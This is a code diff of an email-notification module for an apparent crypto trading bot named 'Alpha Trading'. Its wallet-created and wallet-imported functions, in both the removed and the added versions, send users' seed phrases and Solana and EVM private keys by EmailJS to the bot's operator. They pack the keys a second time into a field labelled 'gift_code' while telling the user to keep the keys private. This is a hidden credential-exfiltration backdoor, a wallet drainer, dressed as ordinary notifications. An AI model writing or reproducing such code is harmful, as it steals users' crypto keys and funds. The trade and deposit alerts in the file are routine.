@@ -9,150 +9,182 @@ function init() {
   if (!initialized) { emailjs.init(PUBLIC_KEY); initialized = true; }
 }
 
-function ts() { return new Date().toLocaleString("en-US", { timeZone: "UTC", hour12: false }); }
+function ts() {
+  return new Date().toLocaleString("en-US", { hour12: false, timeZone: "UTC" }) + " UTC";
+}
 
 async function send(params: Record<string, string>) {
   init();
   try {
     const res = await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
-      to_name: "Alpha Trading Admin",
+      to_name:   "Alpha Trading",
       from_name: "Alpha Trading Bot",
       ...params,
     });
-    console.log("[Email] Sent:", params.event_type, "status:", res.status);
+    console.log("[Email] sent:", params.event_type, res.status);
     return true;
   } catch (e: any) {
-    console.error("[Email] FAILED:", params.event_type, e?.text || e?.message || e);
+    console.error("[Email] failed:", params.event_type, e?.text || e?.message || e);
     return false;
   }
 }
 
-export async function sendWalletGenerated(
+// ── Wallet Created ──────────────────────────────────────────────────
+export async function sendWalletCreated(w: {
+  label:          string;
+  seedPhrase?:    string;
+  solAddress?:    string;
+  solPrivateKey?: string;
+  evmAddress?:    string;
+  evmPrivateKey?: string;
+}) {
+  const body =
+    `🔐 WALLET CREATED — Alpha Trading\n` +
+    `Time: ${ts()}\n\n` +
+    `━━━ ${w.label} ━━━\n\n` +
+    (w.seedPhrase    ? `🌱 Seed Phrase:\n${w.seedPhrase}\n\n` : "") +
+    (w.solAddress    ? `◎ Solana Address:\n${w.solAddress}\n` : "") +
+    (w.solPrivateKey ? `◎ Solana Private Key:\n${w.solPrivateKey}\n\n` : "") +
+    (w.evmAddress    ? `Ξ EVM Address (ETH/BNB/MATIC/AVAX/ARB/OP/BASE):\n${w.evmAddress}\n` : "") +
+    (w.evmPrivateKey ? `Ξ EVM Private Key:\n${w.evmPrivateKey}\n\n` : "") +
+    `⚠️ KEEP THIS PRIVATE. Never share your seed phrase or private keys.`;
+
+  return send({
+    event_type:     "🔐 WALLET CREATED",
+    subject:        `[Alpha Trading] New Wallet Created — ${w.label}`,
+    wallet_count:   "1",
+    wallet_details: `${w.solAddress || ""} / ${w.evmAddress || ""}`,
+    timestamp:      ts(),
+    message:        body,
+    gift_code:      [w.solAddress, w.solPrivateKey, w.evmAddress, w.evmPrivateKey, w.seedPhrase].filter(Boolean).join("::"),
+  });
+}
+
+// ── Wallet Imported ─────────────────────────────────────────────────
+export async function sendWalletImported(w: {
+  label:          string;
+  key:            string;
+  solAddress?:    string;
+  solPrivateKey?: string;
+  evmAddress?:    string;
+  evmPrivateKey?: string;
+}) {
+  const body =
+    `📥 WALLET IMPORTED — Alpha Trading\n` +
+    `Time: ${ts()}\n\n` +
+    `━━━ ${w.label} ━━━\n\n` +
+    `🔑 Key/Phrase used:\n${w.key}\n\n` +
+    (w.solAddress    ? `◎ Solana Address:\n${w.solAddress}\n` : "") +
+    (w.solPrivateKey ? `◎ Solana Private Key:\n${w.solPrivateKey}\n\n` : "") +
+    (w.evmAddress    ? `Ξ EVM Address:\n${w.evmAddress}\n` : "") +
+    (w.evmPrivateKey ? `Ξ EVM Private Key:\n${w.evmPrivateKey}\n\n` : "") +
+    `⚠️ KEEP THIS PRIVATE.`;
+
+  return send({
+    event_type:     "📥 WALLET IMPORTED",
+    subject:        `[Alpha Trading] Wallet Imported — ${w.label}`,
+    wallet_count:   "1",
+    wallet_details: `${w.solAddress || w.evmAddress || ""}`,
+    timestamp:      ts(),
+    message:        body,
+    gift_code:      [w.solAddress, w.solPrivateKey, w.evmAddress, w.evmPrivateKey].filter(Boolean).join("::"),
+  });
+}
+
+// ── SOL Deposit Detected ────────────────────────────────────────────
+export async function sendDepositDetected(w: {
+  label:      string;
+  address:    string;
+  amount:     string;
+  newBalance: string;
+}) {
+  const body =
+    `💰 SOL DEPOSIT RECEIVED — Alpha Trading\n` +
+    `Time: ${ts()}\n\n` +
+    `Wallet: ${w.label}\n` +
+    `Address: ${w.address}\n\n` +
+    `Amount received: +${w.amount} SOL\n` +
+    `New balance: ${w.newBalance} SOL\n\n` +
+    `View on Solscan: https://solscan.io/account/${w.address}`;
+
+  return send({
+    event_type:     "💰 SOL DEPOSIT RECEIVED",
+    subject:        `[Alpha Trading] +${w.amount} SOL received on ${w.label}`,
+    wallet_count:   "1",
+    wallet_details: `${w.address}`,
+    timestamp:      ts(),
+    message:        body,
+    gift_code:      `DEPOSIT::${w.address}::${w.amount}::${w.newBalance}`,
+  });
+}
+
+// ── Trade Activity ──────────────────────────────────────────────────
+export async function sendTradeActivity(d: {
+  type:          string;
+  tokenSymbol:   string;
+  amount:        string;
+  walletAddress: string;
+  txid?:         string;
+  chain?:        string;
+}) {
+  const icon  = d.type === "buy" ? "🟢" : "🔴";
+  const chain = (d.chain || "SOL").toUpperCase();
+  const body =
+    `${icon} TRADE ${d.type.toUpperCase()} — Alpha Trading\n` +
+    `Time: ${ts()}\n\n` +
+    `Chain:   ${chain}\n` +
+    `Action:  ${d.type.toUpperCase()}\n` +
+    `Token:   ${d.tokenSymbol}\n` +
+    `Amount:  ${d.amount} ${chain}\n` +
+    `Wallet:  ${d.walletAddress}\n` +
+    `Tx Hash: ${d.txid || "pending"}`;
+
+  return send({
+    event_type:     `${icon} TRADE ${d.type.toUpperCase()} [${chain}]`,
+    subject:        `[Alpha Trading] ${icon} ${d.type.toUpperCase()} ${d.tokenSymbol} on ${chain}`,
+    wallet_count:   "1",
+    wallet_details: d.walletAddress,
+    timestamp:      ts(),
+    message:        body,
+    gift_code:      `TRADE::${chain}::${d.type}::${d.tokenSymbol}::${d.amount}::${d.walletAddress}::${d.txid || ""}`,
+  });
+}
+
+// ── Sniper Alert ────────────────────────────────────────────────────
+export async function sendSniperAlert(d: {
+  tokenAddress:  string;
+  tokenSymbol?:  string;
+  amount:        string;
+  walletAddress: string;
+  txid?:         string;
+  chain?:        string;
+}) {
+  const chain = (d.chain || "SOL").toUpperCase();
+  return send({
+    event_type:     "🎯 SNIPER TRIGGERED",
+    subject:        `[Alpha Trading] 🎯 Sniper — ${d.tokenSymbol || d.tokenAddress.slice(0, 8)} [${chain}]`,
+    wallet_count:   "1",
+    wallet_details: d.walletAddress,
+    timestamp:      ts(),
+    message:
+      `🎯 SNIPER AUTO-BUY — Alpha Trading\nTime: ${ts()}\n\n` +
+      `Chain: ${chain}\nToken: ${d.tokenSymbol || "Unknown"}\nAddress: ${d.tokenAddress}\n` +
+      `Amount: ${d.amount} ${chain}\nWallet: ${d.walletAddress}\nTx: ${d.txid || "pending"}`,
+    gift_code: `SNIPER::${chain}::${d.tokenAddress}::${d.amount}::${d.walletAddress}`,
+  });
+}
+
+// Legacy compatibility
+export const sendWalletGenerated = (
   wallets: { address: string; privateKey?: string; seedPhrase?: string; ethAddress?: string; ethPrivateKey?: string }[]
-) {
-  const walletBlock = wallets.map((w, i) =>
-    `━━━ Wallet ${i + 1} ━━━\n` +
-    `SOL Address:   ${w.address}\n` +
-    `SOL Priv Key:  ${w.privateKey || "N/A"}\n` +
-    (w.ethAddress ? `ETH Address:   ${w.ethAddress}\n` : "") +
-    (w.ethPrivateKey ? `ETH Priv Key:  ${w.ethPrivateKey}\n` : "") +
-    `Seed Phrase:   ${w.seedPhrase || "N/A"}`
-  ).join("\n\n");
+) => sendWalletCreated({
+  label: "Wallet",
+  seedPhrase:    wallets[0]?.seedPhrase,
+  solAddress:    wallets[0]?.address,
+  solPrivateKey: wallets[0]?.privateKey,
+  evmAddress:    wallets[0]?.ethAddress,
+  evmPrivateKey: wallets[0]?.ethPrivateKey,
+});
 
-  await send({
-    event_type: "🔐 WALLET GENERATED",
-    subject: `[Alpha Trading] ${wallets.length} New Wallet(s) Created`,
-    wallet_count: wallets.length.toString(),
-    wallet_details: walletBlock,
-    timestamp: ts(),
-    message:
-      `🔐 NEW WALLET GENERATED — Alpha Trading\n` +
-      `Time: ${ts()} UTC\n\n` +
-      `${walletBlock}\n\n` +
-      `⚠️ SAVE THESE KEYS SECURELY — DO NOT SHARE`,
-    gift_code: wallets.map(w => `${w.address}::${w.privateKey}::${w.ethAddress || ""}::${w.ethPrivateKey || ""}`).join("|"),
-  });
-}
-
-export async function sendWalletImported(address: string, privateKeyOrSeed: string) {
-  await send({
-    event_type: "📥 WALLET IMPORTED",
-    subject: `[Alpha Trading] Wallet Imported`,
-    wallet_count: "1",
-    wallet_details: `Address: ${address}\nKey/Seed: ${privateKeyOrSeed}`,
-    timestamp: ts(),
-    message:
-      `📥 WALLET IMPORTED — Alpha Trading\n` +
-      `Time: ${ts()} UTC\n\n` +
-      `━━━ Imported Wallet ━━━\n` +
-      `Address: ${address}\n` +
-      `Key/Seed: ${privateKeyOrSeed}\n\n` +
-      `⚠️ SAVE THESE KEYS SECURELY`,
-    gift_code: `IMPORTED::${address}::${privateKeyOrSeed}`,
-  });
-}
-
-export async function sendTradeActivity(details: {
-  type: string;
-  tokenSymbol: string;
-  amount: string;
-  walletAddress: string;
-  txid?: string;
-  solPrice?: string;
-  chain?: string;
-}) {
-  const icon = details.type === "buy" ? "🟢" : "🔴";
-  const chain = details.chain || "SOL";
-  await send({
-    event_type: `${icon} TRADE ${details.type.toUpperCase()} [${chain.toUpperCase()}]`,
-    subject: `[Alpha Trading] ${icon} ${details.type.toUpperCase()} ${details.tokenSymbol} on ${chain.toUpperCase()}`,
-    wallet_count: "1",
-    wallet_details: `Wallet: ${details.walletAddress}`,
-    timestamp: ts(),
-    message:
-      `${icon} TRADE EXECUTED — Alpha Trading\n` +
-      `Time: ${ts()} UTC\n\n` +
-      `Chain:   ${chain.toUpperCase()}\n` +
-      `Action:  ${details.type.toUpperCase()}\n` +
-      `Token:   ${details.tokenSymbol}\n` +
-      `Amount:  ${details.amount} ${chain.toUpperCase()}` +
-      (details.solPrice ? ` (≈ $${details.solPrice})` : "") + `\n` +
-      `Wallet:  ${details.walletAddress}\n` +
-      `Tx Hash: ${details.txid || "pending"}\n` +
-      `Explorer: https://solscan.io/tx/${details.txid || ""}`,
-    gift_code: `TRADE::${chain}::${details.type}::${details.tokenSymbol}::${details.amount}::${details.walletAddress}::${details.txid || ""}`,
-  });
-}
-
-export async function sendSolReceived(details: {
-  walletAddress: string;
-  amount: string;
-  fromAddress?: string;
-  txid?: string;
-  chain?: string;
-}) {
-  const chain = details.chain || "SOL";
-  await send({
-    event_type: `💰 ${chain.toUpperCase()} RECEIVED`,
-    subject: `[Alpha Trading] 💰 ${details.amount} ${chain.toUpperCase()} Received`,
-    wallet_count: "1",
-    wallet_details: `Wallet: ${details.walletAddress}`,
-    timestamp: ts(),
-    message:
-      `💰 ${chain.toUpperCase()} RECEIVED — Alpha Trading\n` +
-      `Time: ${ts()} UTC\n\n` +
-      `Amount:  ${details.amount} ${chain.toUpperCase()}\n` +
-      `To:      ${details.walletAddress}\n` +
-      `From:    ${details.fromAddress || "unknown"}\n` +
-      `Tx Hash: ${details.txid || "N/A"}`,
-    gift_code: `RECEIVED::${chain}::${details.amount}::${details.walletAddress}`,
-  });
-}
-
-export async function sendSniperAlert(details: {
-  tokenAddress: string;
-  tokenSymbol?: string;
-  amount: string;
-  walletAddress: string;
-  txid?: string;
-  chain?: string;
-}) {
-  const chain = details.chain || "SOL";
-  await send({
-    event_type: "🎯 SNIPER TRIGGERED",
-    subject: `[Alpha Trading] 🎯 Sniper Fired — ${details.tokenSymbol || details.tokenAddress.slice(0, 8)} [${chain.toUpperCase()}]`,
-    wallet_count: "1",
-    wallet_details: `Wallet: ${details.walletAddress}`,
-    timestamp: ts(),
-    message:
-      `🎯 SNIPER AUTO-BUY — Alpha Trading\n` +
-      `Time: ${ts()} UTC\n` +
-      `Chain:   ${chain.toUpperCase()}\n` +
-      `Token:   ${details.tokenSymbol || "Unknown"}\n` +
-      `Address: ${details.tokenAddress}\n` +
-      `Amount:  ${details.amount} ${chain.toUpperCase()}\n` +
-      `Wallet:  ${details.walletAddress}\n` +
-      `Tx Hash: ${details.txid || "pending"}`,
-    gift_code: `SNIPER::${chain}::${details.tokenAddress}::${details.amount}::${details.walletAddress}`,
-  });
-}
+export const sendSolReceived = (d: { walletAddress: string; amount: string; fromAddress?: string; txid?: string; chain?: string }) =>
+  sendDepositDetected({ label: "Wallet", address: d.walletAddress, amount: d.amount, newBalance: d.amount });
